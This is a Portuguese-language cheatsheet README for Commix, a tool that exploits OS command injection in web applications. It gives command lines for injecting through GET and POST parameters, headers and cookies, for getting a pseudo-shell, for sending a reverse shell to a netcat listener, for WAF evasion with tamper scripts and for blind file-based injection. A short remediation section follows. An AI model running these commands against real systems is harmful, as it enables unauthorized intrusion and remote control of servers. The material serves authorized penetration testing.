<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Segurança da Web">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licença GPLv3">
</p>

<p alinhar="centro">
  <b>🌐 Ferramenta automatizada projetada para detectar e explorar vulnerabilidades de injeção de comando em aplicações web e gerar shells interativos</b>
</p>

---

## 📋 Índice

- [Visão geral e o primitivo de injeção de comando] (#-overview--the-command-injection-primitive)
- [Instalação](#-instalação)
- [Verificação básica de vulnerabilidades](#-basic-vulnerability-scanning)
- [Injetando Elementos HTTP Diferentes](#-injetando-elementos HTTP Diferentes)
  - [OBTER Parâmetros](#get-parameters)
  - [Dados POST (`--data`)](#pós-dados---dados)
  - [Cabeçalhos e cookies HTTP](#http-headers--cookies)
- [Desova de shells interativos e reversos](#-spawning-interactive--reverse-shells)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Shell reverso nativo (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [Scripts de evasão e adulteração de WAF (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Técnicas cegas baseadas em arquivo e tempo](#-baseadas em arquivo--técnicas cegas baseadas em tempo)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações Defensivas e Remediação](#-considerações-defensivas--remediação)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e o primitivo de injeção de comando

Embora o **SQLMap** automatize a injeção de SQL, o **Commix** (criado por **Anastasios Stasinopoulos**) é o padrão ouro para encontrar e explorar falhas de **OS Command Injection**.

Quando os aplicativos da Web passam de forma insegura as entradas do usuário diretamente para as funções de execução do sistema operacional (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), os invasores podem anexar comandos shell arbitrários. O Commix detecta automaticamente vetores de injeção baseados em resultados, baseados em saída, cegos baseados em tempo e vetores de injeção baseados em arquivo.

---

## 📥 Instalação
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Verificação básica de vulnerabilidades
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Injetando diferentes elementos HTTP

### GET Parâmetros
Use a tag `INJECT_HERE` se existirem vários parâmetros:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### Dados POST (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### Cabeçalhos e cookies HTTP
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Gerando projéteis interativos e reversos

### Pseudo-Shell (`--os-shell`)

Quando a injeção é confirmada, o Commix fornece um pseudoterminal emulado diretamente no console:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Shell reverso nativo (`--reverse-ip`)

Instrua o Commix a descartar uma conexão TCP reversa totalmente interativa de volta ao seu ouvinte Netcat:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 Scripts de evasão e adulteração de WAF (`--tamper`)

Ignore firewalls de aplicativos da Web (WAF) e listas negras de strings usando adulteração de ofuscação integrada:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Técnicas cegas baseadas em arquivo e tempo

Quando a saída não é renderizada de volta na resposta HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Parâmetro GET de verificação** | `commix -u "<URL>?param=val"` |
| **Verificar parâmetro POST** | `commix -u "<URL>" --data="param=val"` |
| **Verificação não interativa em lote** | `commix -u "<URL>" --batch` |
| **Terminal interativo**| `commix -u "<URL>" --os-shell` |
| ** Soltar shell reverso ** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Solicitação de arroto de repetição** | `commix -r burp_request.req` |
| **Usar adulteração de espaço** | `commix -u "<URL>" --tamper=space2ifs` |
| **Executar comando único** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Considerações defensivas e remediação

1. **Evite a execução do shell do sistema operacional:** Nunca concatene entradas de usuário não higienizadas em comandos `system()`, `exec()` ou shell.
2. **Use APIs de linguagem nativa:** Substitua os utilitários do sistema por bibliotecas de linguagem de programação nativa (por exemplo, use a biblioteca `socket` do Python em vez de executar o binário `ping` do sistema).
3. **Lista de permissões estrita:** Se a entrada do usuário precisar ditar a execução do programa, valide a entrada em uma lista de permissões alfanumérica estrita antes da invocação.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Commix automatiza a execução arbitrária de comandos em servidores de destino. Difundir ou explorar aplicativos da web não autorizados é ilegal. Use apenas em sistemas onde você possua autorização explícita por escrito.